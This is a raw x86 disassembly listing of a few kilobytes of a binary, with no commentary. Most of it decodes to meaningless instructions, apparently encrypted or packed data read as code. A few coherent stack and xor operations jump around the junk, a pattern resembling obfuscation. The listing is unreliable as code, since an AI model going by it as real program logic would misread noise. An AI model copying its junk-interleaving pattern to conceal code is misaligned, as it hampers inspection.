  40bbaa:	shld   DWORD PTR [ecx+0xe466300],ebx,0xea
  40bbb2:	mov    BYTE PTR [edi-0x21],bh
  40bbb5:	jbe    0x40bbd6
  40bbb7:	repz adc bl,BYTE PTR [ebp+0x2e]
  40bbbb:	repnz or bh,BYTE PTR [edx-0x21]
  40bbbf:	cdq    
  40bbc0:	into   
  40bbc1:	or     bh,BYTE PTR [ebx-0x72]
  40bbc4:	pop    ebx
  40bbc5:	aaa    
  40bbc6:	and    esi,ecx
  40bbc8:	in     al,dx
  40bbc9:	or     al,0xa3
  40bbcb:	sbb    ebp,DWORD PTR [edx+eiz*1]
  40bbce:	cmp    ch,bl
  40bbd0:	jbe    0x40bb9a
  40bbd2:	addr16 xor al,0xc0
  40bbd5:	(bad)  [eax-0x70b9e30b]
  40bbdb:	ins    BYTE PTR es:[edi],dx
  40bbdc:	mov    ds:0x2f54f7c,eax
  40bbe1:	mov    bl,0xfd
  40bbe3:	into   
  40bbe4:	aam    0xe7
  40bbe6:	lods   al,BYTE PTR ds:[esi]
  40bbe7:	outs   dx,DWORD PTR ds:[esi]
  40bbe8:	scas   al,BYTE PTR es:[edi]
  40bbe9:	and    dh,BYTE PTR [edx-0x450f3c17]
  40bbef:	mov    cl,0xdd
  40bbf1:	and    BYTE PTR [ecx-0x22],0x78
  40bbf5:	aaa    
  40bbf6:	bnd jmp 0x40bb93
  40bbf9:	les    edx,FWORD PTR [edx]
  40bbfb:	dec    esp
  40bbfc:	cli    
  40bbfd:	icebp  
  40bbfe:	sub    al,0x8c
  40bc00:	mov    edi,0x91bbc388
  40bc05:	test   dl,ah
  40bc07:	jl     0x40bbf7
  40bc09:	iret   
  40bc0a:	and    dl,BYTE PTR [ebx-0x80]
  40bc0d:	cmp    eax,0x60a4d8fc
  40bc12:	xor    ebp,DWORD PTR es:[ebx+0x39]
  40bc16:	aad    0x51
  40bc18:	popf   
  40bc19:	fisub  DWORD PTR [ebp-0x433310f7]
  40bc1f:	mov    dl,0x3f
  40bc21:	adc    BYTE PTR [ebx],bl
  40bc23:	inc    ebp
  40bc24:	mov    ?,WORD PTR [ebp-0x75]
  40bc27:	test   eax,0x6fdac176
  40bc2c:	cmp    BYTE PTR [ebx+0x29484d40],al
  40bc32:	aas    
  40bc33:	dec    ebx
  40bc34:	sbb    eax,0x49526058
  40bc39:	xor    bh,dh
  40bc3b:	out    0x53,eax
  40bc3d:	js     0x40bcb6
  40bc3f:	stos   BYTE PTR es:[edi],al
  40bc40:	icebp  
  40bc41:	cmp    dh,BYTE PTR [edx+0x6216311]
  40bc47:	setle  dh
  40bc4a:	test   DWORD PTR [esi+0x617f0746],ebp
  40bc50:	mov    eax,ds:0x8eb74db1
  40bc55:	push   ss
  40bc56:	sti    
  40bc57:	xchg   ecx,eax
  40bc58:	lds    edx,FWORD PTR [ebx+eax*2-0x61ff867]
  40bc5f:	movzx  eax,WORD PTR [eax+edi*2]
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	mov    esp,0xc6347784
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	sti    
  40bca2:	aad    0x1a
  40bca4:	(bad)  
  40bca5:	pop    ebp
  40bca6:	test   eax,0x616b3bc6
  40bcab:	xor    eax,DWORD PTR [esi]
  40bcad:	sbb    DWORD PTR [edi],esi
  40bcaf:	cmp    BYTE PTR [eax-0x5a],ah
  40bcb2:	mov    ch,0xbc
  40bcb4:	ret    
  40bcb5:	xor    BYTE PTR [eax-0x101a57f8],0xe9
  40bcbc:	dec    ebp
  40bcbd:	and    ecx,DWORD PTR [esi+ebx*4+0x68]
  40bcc1:	sub    esi,DWORD PTR [ebp-0x4a094a20]
  40bcc7:	ret    
  40bcc8:	iret   
  40bcc9:	pop    ebp
  40bcca:	and    eax,0xa43e2fbf
  40bccf:	cmp    BYTE PTR [eax+ebp*1+0x3af8b1d5],bh
  40bcd6:	enter  0x8a6f,0xdf
  40bcda:	push   0x6ae294c5
  40bcdf:	into   
  40bce0:	in     al,dx
  40bce1:	mul    BYTE PTR [edx]
  40bce3:	xchg   ebx,eax
  40bce4:	scas   al,BYTE PTR es:[edi]
  40bce5:	adc    bl,BYTE PTR [ecx+0x321364bf]
  40bceb:	ins    DWORD PTR es:[edi],dx
  40bcec:	sbb    ah,BYTE PTR [ecx]
  40bcee:	xchg   ebp,eax
  40bcef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcf0:	mov    dh,0xee
  40bcf2:	stc    
  40bcf3:	ins    DWORD PTR es:[edi],dx
  40bcf4:	pop    edx
  40bcf5:	pop    eax
  40bcf6:	mov    bl,0xd3
  40bcf8:	outs   dx,DWORD PTR ds:[esi]
  40bcf9:	xor    cl,BYTE PTR [edx+0x13]
  40bcfc:	adc    BYTE PTR [edi+0x19],0x3b
  40bd00:	and    edx,DWORD PTR [ebp+esi*4+0x3a603a5b]
  40bd07:	sub    DWORD PTR [edi],edx
  40bd09:	js     0x40bd1f
  40bd0b:	sub    ecx,0xffffff89
  40bd0e:	sbb    al,0x3a
  40bd10:	push   ss
  40bd11:	mov    bl,0x34
  40bd13:	mov    cl,0x56
  40bd15:	int3   
  40bd16:	daa    
  40bd17:	jecxz  0x40bd4c
  40bd19:	shl    BYTE PTR [ecx*2-0x48532dea],0xe4
  40bd21:	test   esp,0xc12086b5
  40bd27:	dec    edx
  40bd28:	xchg   ebp,eax
  40bd29:	sti    
  40bd2a:	pop    eax
  40bd2b:	ret    
  40bd2c:	imul   ecx,DWORD PTR [edi+eax*1],0xffffff93
  40bd30:	(bad)  
  40bd31:	rcr    DWORD PTR [ebx+ebp*2-0x20],1
  40bd35:	mul    DWORD PTR [edx-0x7a]
  40bd38:	push   edx
  40bd39:	inc    esi
  40bd3a:	les    esi,FWORD PTR [edx]
  40bd3c:	cld    
  40bd3d:	inc    edx
  40bd3e:	(bad)  
  40bd3f:	aaa    
  40bd40:	lock sub eax,0x1ed6fabf
  40bd46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd47:	push   ebp
  40bd48:	mov    ?,WORD PTR [ecx]
  40bd4a:	sub    bh,BYTE PTR [edx+esi*4]
  40bd4d:	imul   esp,eax,0x68
  40bd50:	or     eax,ecx
  40bd52:	push   0xffffffbd
  40bd54:	dec    edi
  40bd55:	push   ecx
  40bd56:	fdiv   DWORD PTR [edi-0x44c3b16]
  40bd5c:	sub    edi,DWORD PTR [esi-0x7a]
  40bd5f:	or     ebx,edi
  40bd61:	ret    0x68fe
  40bd64:	cmp    eax,ebx
  40bd66:	outs   dx,BYTE PTR ds:[esi]
  40bd67:	retf   0x730
  40bd6a:	les    esi,FWORD PTR [ebx+0x403f08f4]
  40bd70:	sub    al,0xe5
  40bd72:	adc    esi,esp
  40bd74:	push   eax
  40bd75:	sbb    al,0xe6
  40bd77:	mov    esp,eax
  40bd79:	call   0x622c:0x9d0adcd
  40bd80:	cwde   
  40bd81:	sub    eax,0x9d33aab6
  40bd86:	imul   edi,DWORD PTR [ecx-0xaba7856],0x4
  40bd8d:	inc    eax
  40bd8e:	repnz fist DWORD PTR [ecx+0x6a]
  40bd92:	cmp    DWORD PTR [ebx+eax*8+0x49ed5968],ebx
  40bd99:	sbb    ebp,DWORD PTR [edx]
  40bd9b:	es or  cl,bh
  40bd9e:	outs   dx,BYTE PTR ds:[esi]
  40bd9f:	mov    bl,0xc
  40bda1:	mov    dh,0x6c
  40bda3:	sbb    ebx,0x709cefaf
  40bda9:	inc    ebx
  40bdaa:	jp     0x40bd71
  40bdac:	xor    BYTE PTR [ebx-0x124ae7b1],ah
  40bdb2:	push   cs
  40bdb3:	test   DWORD PTR [edi-0x6a],esp
  40bdb6:	lea    ebp,[ebp+0x21c4b3c3]
  40bdbc:	imul   esi,DWORD PTR [edx],0x81eafa05
  40bdc2:	push   ebp
  40bdc3:	cmp    BYTE PTR [eax+0x7538b364],cl
  40bdc9:	loope  0x40bdac
  40bdcb:	(bad)  
  40bdcc:	std    
  40bdcd:	ja     0x40bdf6
  40bdcf:	sub    bl,BYTE PTR [eax+0x655192b1]
  40bdd5:	test   esi,ebx
  40bdd7:	pop    ss
  40bdd8:	sar    DWORD PTR [ecx-0x4df2b92],1
  40bdde:	shl    DWORD PTR [ecx+0x64],1
  40bde1:	pop    ds
  40bde2:	sbb    eax,0x1b29465b
  40bde7:	cmp    BYTE PTR [edx+0x5],dh
  40bdea:	imul   ebx,DWORD PTR [ebx-0x410c7633],0xecddba07
  40bdf4:	or     DWORD PTR [ebx],0x7845f8fa
  40bdfa:	push   cs
  40bdfb:	rcl    DWORD PTR [ebp-0x5088893e],1
  40be01:	clc    
  40be02:	cmp    DWORD PTR [ebx],esi
  40be04:	mov    ebx,0xd20c5766
  40be09:	sbb    DWORD PTR [ecx+0x5b20e48d],esi
  40be0f:	mov    ch,0x5
  40be11:	ss es (bad) 
  40be14:	push   edi
  40be15:	or     esi,0xffffff84
  40be18:	push   ecx
  40be19:	repnz ror BYTE PTR [edx+0x6bcab2f4],0xd1
  40be21:	js     0x40be2c
  40be23:	data16 or al,BYTE PTR [bx+si]
  40be27:	push   ebp
  40be28:	ret    0x328f
  40be2b:	push   edi
  40be2c:	pusha  
  40be2d:	aaa    
  40be2e:	ror    cl,cl
  40be30:	pop    edx
  40be31:	jnp    0x40bdfe
  40be33:	sbb    edx,DWORD PTR [esi]
  40be35:	fwait
  40be36:	loope  0x40bdc4
  40be38:	mov    al,ds:0x1dd9995f
  40be3d:	xchg   dl,dh
  40be3f:	mov    ebp,DWORD PTR [eax-0x8]
  40be42:	mov    edi,DWORD PTR ds:0xa204cd7d
  40be48:	mov    dh,0x38
  40be4a:	xor    ah,BYTE PTR [esi+0x2a8d8aee]
  40be50:	mov    esp,0xfb861458
  40be55:	sbb    BYTE PTR [edx],dh
  40be57:	jge    0x40be3e
  40be59:	mov    ebp,0x4c6588b9
  40be5e:	hlt    
  40be5f:	xchg   esi,eax
  40be60:	inc    ecx
  40be61:	dec    edx
  40be62:	xchg   esi,eax
  40be63:	test   al,0xde
  40be65:	mov    al,0x13
  40be67:	aam    0x3f
  40be69:	ins    BYTE PTR es:[edi],dx
  40be6a:	cmp    BYTE PTR [edx+0x34],0xe3
  40be6e:	mov    ebp,DWORD PTR [edi-0xc46affe]
  40be74:	call   0xffbef49d
  40be79:	repz and al,0x90
  40be7c:	clc    
  40be7d:	or     eax,DWORD PTR [esi+eiz*4+0x16]
  40be81:	retf   0xd108
  40be84:	sub    BYTE PTR [ecx+0x7f0ab395],bh
  40be8a:	xlat   BYTE PTR ds:[ebx]
  40be8b:	scas   eax,DWORD PTR es:[edi]
  40be8c:	es repnz push ecx
  40be8f:	cmp    cl,0xb2
  40be92:	loopne 0x40be70
  40be94:	dec    ecx
  40be95:	mov    dh,BYTE PTR [ecx-0x28]
  40be98:	(bad)  [eax+0x68771bf]
  40be9e:	out    dx,eax
  40be9f:	sbb    dl,dl
  40bea1:	int3   
  40bea2:	aad    0x9
  40bea4:	or     dh,dh
  40bea6:	in     al,dx
  40bea7:	repz dec ebp
  40bea9:	sub    DWORD PTR [ebx-0x68],ebp
  40beac:	jne    0x40be6c
  40beae:	sub    bh,bh
  40beb0:	out    0xe7,al
  40beb2:	test   ebp,ebp
  40beb4:	push   esi
  40beb5:	test   DWORD PTR [esi],eax
  40beb7:	lock lds esi,FWORD PTR [ebx+ebp*2]
  40bebb:	sub    DWORD PTR [ebx-0x4d],0x66
  40bebf:	int    0x41
  40bec1:	xchg   esi,eax
  40bec2:	int    0x40
  40bec4:	call   0x22eb7ec2
  40bec9:	dec    edi
  40beca:	add    al,0xa9
  40becc:	and    eax,0x86914b46
  40bed1:	sahf   
  40bed2:	out    dx,al
  40bed3:	mov    al,ds:0xb0aedbad
  40bed8:	aad    0xf3
  40beda:	ror    BYTE PTR [edx],cl
  40bedc:	add    ecx,edx
  40bede:	lods   eax,DWORD PTR ds:[esi]
  40bedf:	jp     0x40bede
  40bee1:	sbb    eax,0x325ef264
  40bee6:	add    esi,DWORD PTR ds:0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x51e27acf]
  40bf27:	xor    BYTE PTR [eax+0x387e7ef9],al
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf11
  40bf31:	jp     0x40bef5
  40bf33:	retf   
  40bf34:	xlat   BYTE PTR ds:[ebx]
  40bf35:	je     0x40bf33
  40bf37:	fisttp DWORD PTR [ecx-0x32]
  40bf3a:	outs   dx,DWORD PTR ds:[esi]
  40bf3b:	test   al,0x9f
  40bf3d:	adc    BYTE PTR [ecx-0x6e],ch
  40bf40:	pop    es
  40bf41:	pusha  
  40bf42:	pop    edi
  40bf43:	cdq    
  40bf44:	cmp    al,0x44
  40bf46:	es jno 0x40bfc5
  40bf49:	xor    BYTE PTR [eax+0x69],bh
  40bf4c:	pop    ss
  40bf4d:	lods   eax,DWORD PTR ds:[esi]
  40bf4e:	outs   dx,BYTE PTR ds:[esi]
  40bf4f:	(bad)  
  40bf51:	popf   
  40bf52:	adc    al,0xa0
  40bf54:	rcl    DWORD PTR [eax+0x25],1
  40bf57:	lahf   
  40bf58:	jne    0x40bfa1
  40bf5a:	xchg   edi,eax
  40bf5b:	cmp    eax,0x8573b3f
  40bf60:	cmp    ebx,DWORD PTR [ebp+0x20]
  40bf63:	loopne 0x40befa
  40bf65:	mov    bh,0xdd
  40bf67:	pop    ss
  40bf68:	dec    ebp
  40bf69:	xchg   esi,eax
  40bf6a:	push   es
  40bf6b:	arpl   bp,ax
  40bf6d:	xor    dl,BYTE PTR [ebx]
  40bf6f:	add    al,0x94
  40bf71:	dec    ebp
  40bf72:	adc    edx,DWORD PTR [ebp+0x7f]
  40bf75:	(bad)  
  40bf76:	sbb    esi,DWORD PTR ds:[esi+0x55b698cd]
  40bf7d:	inc    ecx
  40bf7e:	inc    esi
  40bf7f:	dec    edx
  40bf80:	xor    BYTE PTR [edi+ecx*2],bl
  40bf83:	dec    edi
  40bf84:	jge    0x40bf9d
  40bf86:	or     BYTE PTR [ecx-0x56],dl
  40bf89:	push   ss
  40bf8a:	mov    ds:0x620cbab,al
  40bf8f:	sbb    DWORD PTR ds:0xb6ff6e56,ecx
  40bf95:	out    0x81,eax
  40bf97:	push   esp
  40bf98:	imul   edi,DWORD PTR [edx-0x176e2f11],0x59
  40bf9f:	aaa    
  40bfa0:	out    dx,al
  40bfa1:	push   cs
  40bfa2:	xchg   esp,eax
  40bfa3:	js     0x40bf6d
  40bfa5:	ins    BYTE PTR es:[edi],dx
  40bfa6:	(bad)  
  40bfa7:	add    BYTE PTR [esi],ch
  40bfa9:	add    BYTE PTR [ebx-0x3263087c],bh
  40bfaf:	dec    eax
  40bfb0:	mov    cl,BYTE PTR [eax]
  40bfb2:	iret   
  40bfb3:	xor    BYTE PTR [eax-0xf034347],bl
  40bfb9:	repz add DWORD PTR [ebp-0x63],esp
  40bfbd:	jp     0x40bfbf
  40bfbf:	dec    eax
  40bfc0:	pushf  
  40bfc1:	stos   DWORD PTR es:[edi],eax
  40bfc2:	retf   
  40bfc3:	sbb    ebp,ebx
  40bfc5:	out    0x7e,al
  40bfc7:	shr    dh,1
  40bfc9:	inc    eax
  40bfca:	push   es
  40bfcb:	add    eax,0xfb5d30bf
  40bfd0:	dec    edx
  40bfd1:	aam    0xb7
  40bfd3:	stos   BYTE PTR es:[edi],al
  40bfd4:	fstp   DWORD PTR ss:[ebx+0x3e1533d8]
  40bfdb:	jmp    0x57fa17fb
  40bfe0:	xor    BYTE PTR [edx+ecx*2],cl
  40bfe3:	hlt    
  40bfe4:	inc    DWORD PTR [edi]
  40bfe6:	lods   al,BYTE PTR ds:[esi]
  40bfe7:	lock (bad) 
  40bfe9:	dec    ebx
  40bfea:	inc    edx
  40bfeb:	into   
  40bfec:	jb     0x40bfa0
  40bfee:	xor    ebx,edx
  40bff0:	and    esi,eax
  40bff2:	inc    esp
  40bff3:	loop   0x40c06a
  40bff5:	cmp    eax,0x36e262cf
  40bffa:	mov    bl,0x70
  40bffc:	add    DWORD PTR [ebp+0x7b],0xffffffe7
  40c000:	imul   BYTE PTR [edx]
  40c002:	loope  0x40c01f
  40c004:	nop
  40c005:	cli    
  40c006:	ror    ebx,0x5d
  40c009:	data16 test al,cl
  40c00c:	rol    DWORD PTR gs:[edi],1
  40c00f:	and    al,0x18
  40c011:	mov    ds:0x87e9d027,eax
  40c016:	inc    ecx
  40c017:	inc    ecx
  40c018:	fcmovnbe st,st(7)
  40c01a:	(bad)  
  40c01c:	iret   
  40c01d:	test   BYTE PTR [eax+0x161d32ff],bh
  40c023:	loope  0x40bffb
  40c025:	and    bl,BYTE PTR [ebx-0x59742482]
  40c02b:	cli    
  40c02c:	jne    0x40c061
  40c02e:	loopne 0x40bfbc
  40c030:	add    DWORD PTR [esi],ecx
  40c032:	adc    BYTE PTR [eax],bh
  40c034:	imul   esi,DWORD PTR [eax-0x605ba874],0x84307ffa
  40c03e:	pop    ebp
  40c03f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c040:	sub    BYTE PTR [ebp+0x5],bh
  40c043:	push   eax
  40c044:	cmp    DWORD PTR [ecx+0x6b],edi
  40c047:	into   
  40c048:	sbb    eax,0xd89c10b4
  40c04d:	inc    ebp
  40c04e:	js     0x40c064
  40c050:	add    cl,0x71
  40c053:	jmp    0xbef08576
  40c058:	push   ds
  40c059:	daa    
  40c05a:	or     eax,DWORD PTR [edx-0x3caf9ab]
  40c060:	ds aam 0xff
  40c063:	lock (bad) 
  40c065:	ja     0x40c07c
  40c067:	aaa    
  40c068:	mov    DWORD PTR [esi-0x1be83820],ecx
  40c06e:	xchg   esi,eax
  40c06f:	sbb    al,0x9
  40c071:	xchg   esi,eax
  40c072:	lods   eax,DWORD PTR ds:[esi]
  40c073:	(bad)  
  40c074:	out    dx,eax
  40c075:	lahf   
  40c076:	je     0x40c0bf
  40c078:	outs   dx,BYTE PTR ds:[esi]
  40c079:	pop    edx
  40c07a:	inc    eax
  40c07b:	fs pop esp
  40c07d:	lahf   
  40c07e:	popf   
  40c07f:	sub    BYTE PTR [ebx],bh
  40c081:	xchg   ebx,eax
  40c082:	mov    ds:0x635127e7,eax
  40c087:	add    BYTE PTR [edi+eax*4-0x37f71baf],0x6f
  40c08f:	xchg   DWORD PTR [ecx+0x6917c90c],ecx
  40c095:	or     bl,BYTE PTR [edi+0x76e23b43]
  40c09b:	retf   0x13e2
  40c09e:	fnsave [ebp+0x32]
  40c0a1:	pop    ecx
  40c0a2:	dec    ecx
  40c0a3:	mov    esp,0x30d9e365
  40c0a8:	shr    DWORD PTR [bp-0x491f],0xb6
  40c0ae:	jne    0x40c12a
  40c0b0:	outs   dx,BYTE PTR ds:[esi]
  40c0b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0b2:	add    al,0xf9
  40c0b4:	xchg   ecx,eax
  40c0b5:	ret    0x3ea3
  40c0b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0b9:	push   ds
  40c0ba:	and    DWORD PTR es:[edi],0xbc4a50ed
  40c0c1:	(bad)  
  40c0c2:	clc    
  40c0c3:	cmp    BYTE PTR [edi+0x6cb0271d],ch
  40c0c9:	fldcw  WORD PTR [ebp+0x2744112b]
  40c0cf:	aam    0x51
  40c0d1:	push   eax
  40c0d2:	jo     0x40c070
  40c0d4:	mov    eax,0xa03e052c
  40c0d9:	(bad)
  40c0dc:	dec    edi
  40c0dd:	fbstp  TBYTE PTR [edx]
  40c0df:	jbe    0x40c15e
  40c0e1:	push   edi
  40c0e2:	scas   al,BYTE PTR es:[edi]
  40c0e3:	ret    0xd629
  40c0e6:	jg     0x40c0e1
  40c0e8:	sti    
  40c0e9:	fidivr DWORD PTR [edi+0x6c90fa99]
  40c0ef:	in     al,0x6e
  40c0f1:	das    
  40c0f2:	rcl    BYTE PTR [edx+esi*2-0x7b],1
  40c0f6:	or     DWORD PTR [esi],ecx
  40c0f8:	ins    BYTE PTR es:[edi],dx
  40c0f9:	add    eax,0xcf51803b
  40c0fe:	ins    BYTE PTR es:[edi],dx
  40c0ff:	xchg   edx,eax
  40c100:	jnp    0x40c0a9
  40c102:	nop
  40c103:	xchg   DWORD PTR [esi+0x2f],edi
  40c106:	jmp    0x8be084d8
  40c10b:	cmc    
  40c10c:	xor    eax,ebp
  40c10e:	jmp    0xe0b5:0x334803a8
  40c115:	test   DWORD PTR [esi],esi
  40c117:	fst    DWORD PTR [esi]
  40c119:	(bad)  
  40c11a:	jle    0x40c0f9
  40c11c:	ret    
  40c11d:	and    al,BYTE PTR [ecx+0x46]
  40c120:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c121:	lods   eax,DWORD PTR fs:[si]
  40c124:	xchg   ebx,eax
  40c125:	dec    esp
  40c126:	js     0x40c13c
  40c128:	sahf   
  40c129:	test   DWORD PTR [edx],0xc88b1900
  40c12f:	fwait
  40c130:	cmp    DWORD PTR [ebx+0x6c],edi
  40c133:	jg     0x40c0f0
  40c135:	(bad)  
  40c136:	cmp    al,0xcd
  40c138:	retf   
  40c139:	(bad)  
  40c13a:	ds into 
  40c13c:	ror    BYTE PTR [edi-0x4c],1
  40c13f:	(bad)  
  40c140:	pop    edx
  40c141:	(bad)  
  40c143:	mov    al,ds:0x5543ab7d
  40c148:	retf   
  40c149:	xor    cl,BYTE PTR [ebp+0x70]
  40c14c:	mov    ecx,0x908d8ee0
  40c151:	mov    al,ds:0x2cc72921
  40c156:	dec    esp
  40c157:	lods   eax,DWORD PTR ds:[esi]
  40c158:	xor    BYTE PTR [esi+0xd6caa21],dl
  40c15e:	add    DWORD PTR [edi-0x31],0xffffffd3
  40c162:	jmp    0x5a12320
  40c167:	push   ebx
  40c168:	imul   eax,DWORD PTR [edx],0x38
  40c16b:	mov    ebp,0x78e05226
  40c170:	retf   
  40c171:	cmp    edx,edx
  40c173:	stos   DWORD PTR es:[edi],eax
  40c174:	dec    BYTE PTR [edx]
  40c176:	xchg   ebx,ecx
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xbf
  40c196:	inc    ebx
  40c197:	int    0xc8
  40c199:	dec    edx
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	push   0xffffffd7
  40c1a3:	iret   
  40c1a4:	jle    0x40c1bf
  40c1a6:	call   0x752c:0x6110ca9f
  40c1ad:	loope  0x40c185
  40c1af:	jne    0x40c17f
  40c1b1:	sub    al,0xb5
  40c1b3:	leave  
  40c1b4:	mov    bl,BYTE PTR [esi+0x5806d136]
  40c1ba:	mov    ah,0xf9
  40c1bc:	sbb    bh,BYTE PTR [edx-0x668986e9]
  40c1c2:	or     bh,BYTE PTR [edx-0x5d]
  40c1c5:	jmp    0xbe238eb1
  40c1ca:	push   0xffffffaf
  40c1cc:	test   al,0x26
  40c1ce:	push   ecx
  40c1cf:	lods   al,BYTE PTR ds:[esi]
  40c1d0:	iret   
  40c1d1:	dec    esi
  40c1d2:	add    eax,0xe81a12b9
  40c1d7:	xchg   BYTE PTR [ebx],bh
  40c1d9:	dec    edi
  40c1da:	mov    gs,ebp
  40c1dc:	mov    ds:0xebd40b7f,al
  40c1e1:	sbb    BYTE PTR [edx],dl
  40c1e3:	fisubr WORD PTR [eax-0x34]
  40c1e6:	loop   0x40c173
  40c1e8:	xlat   BYTE PTR ds:[ebx]
  40c1e9:	js     0x40c1db
  40c1eb:	xchg   edi,eax
  40c1ec:	loope  0x40c247
  40c1ee:	or     DWORD PTR [esi+eax*1+0x39],edx
  40c1f2:	mov    ah,0x11
  40c1f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1f5:	sahf   
  40c1f6:	adc    eax,0xfd2447a9
  40c1fb:	cmp    esi,DWORD PTR [ecx]
  40c1fd:	clc    
  40c1fe:	add    DWORD PTR gs:[ebx+0xaeb4fa3],edx
  40c205:	add    BYTE PTR [eax],bl
  40c207:	dec    ebp
  40c208:	and    al,0x4c
  40c20a:	push   ds
  40c20b:	scas   al,BYTE PTR es:[edi]
  40c20c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c20d:	or     al,0xca
  40c20f:	loop   0x40c206
  40c211:	add    DWORD PTR [ebx],eax
  40c213:	int3   
  40c214:	xor    eax,ebp
  40c216:	jecxz  0x40c24c
  40c218:	outs   dx,BYTE PTR ds:[esi]
  40c219:	jbe    0x40c1cd
  40c21b:	inc    ebp
  40c21c:	push   0xf9dad12b
  40c221:	push   ecx
  40c222:	jnp    0x40c207
  40c224:	mov    edx,0x564a3a9c
  40c229:	jnp    0x40c290
  40c22b:	xchg   edi,eax
  40c22c:	stc    
  40c22d:	cld    
  40c22e:	mov    ebx,0xbb9ec1ba
  40c233:	pop    ebx
  40c234:	neg    DWORD PTR [ebp-0x2778e0b1]
  40c23a:	push   cs
  40c23b:	ins    DWORD PTR es:[edi],dx
  40c23c:	push   edi
  40c23d:	bnd jge 0x40c1d6
  40c240:	and    bl,BYTE PTR [edi+0x4b5e0c4]
  40c246:	mov    esp,0x15e79048
  40c24b:	sub    dh,BYTE PTR gs:[edx]
  40c24e:	add    eax,0x1954c0a
  40c253:	dec    eax
  40c254:	loop   0x40c22c
  40c256:	mov    bh,0x7d
  40c258:	ficomp DWORD PTR [edi+0x2aa364a9]
  40c25e:	pop    eax
  40c25f:	push   esi
  40c260:	out    0x8e,al
  40c262:	sub    DWORD PTR ds:0x3f68f293,ebx
  40c268:	mul    BYTE PTR [ebp-0x2d]
  40c26b:	push   0xc68c3298
  40c270:	adc    dl,bh
  40c272:	idiv   eax
  40c274:	mov    esi,0xe8454763
  40c279:	xor    eax,0x8159e63a
  40c27e:	and    al,0x4f
  40c280:	dec    edx
  40c281:	in     eax,0x44
  40c283:	(bad)  
  40c284:	and    al,0xfe
  40c286:	int3   
  40c287:	ins    BYTE PTR es:[edi],dx
  40c288:	xchg   edi,eax
  40c289:	and    esi,DWORD PTR [ebp-0x26]
  40c28c:	mov    ah,0x8b
  40c28e:	jns    0x40c2dc
  40c290:	sbb    ebp,edx
  40c292:	mov    ebp,DWORD PTR [ecx-0x29300536]
  40c298:	adc    esp,DWORD PTR [eax-0x378f0aa9]
  40c29e:	fmul   QWORD PTR ds:0x5fb7fa87
  40c2a4:	lock mov ebx,edi
  40c2a7:	ret    
  40c2a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2a9:	ret    0x676c
  40c2ac:	adc    bl,BYTE PTR [esi]
  40c2ae:	xor    BYTE PTR [ecx],dl
  40c2b0:	jp     0x40c29a
  40c2b2:	mov    bh,0x2e
  40c2b4:	push   eax
  40c2b5:	js     0x40c259
  40c2b7:	mov    dl,0xc8
  40c2b9:	xchg   ebx,edx
  40c2bb:	pop    ebp
  40c2bc:	mov    ebp,0x2c9fea15
  40c2c1:	ss sbb esi,0xffffff84
  40c2c5:	into   
  40c2c6:	arpl   di,cx
  40c2c8:	xchg   ebp,eax
  40c2c9:	retf   0xdeef
  40c2cc:	add    al,0x50
  40c2ce:	dec    edi
  40c2cf:	xor    al,0x5
  40c2d1:	stos   BYTE PTR es:[edi],al
  40c2d2:	jbe    0x40c2ae
  40c2d4:	nop
  40c2d5:	xchg   esp,eax
  40c2d6:	aas    
  40c2d7:	sub    BYTE PTR [ecx-0x9a5a9e2],ch
  40c2dd:	call   0xaffb:0xe6a794f4
  40c2e4:	popf   
  40c2e5:	sar    edi,cl
  40c2e7:	jmp    0xbb7c:0x8ddd2908
  40c2ee:	clc    
  40c2ef:	dec    edx
  40c2f0:	mov    ah,ah
  40c2f2:	add    bh,BYTE PTR [ecx]
  40c2f4:	mov    ah,0xbd
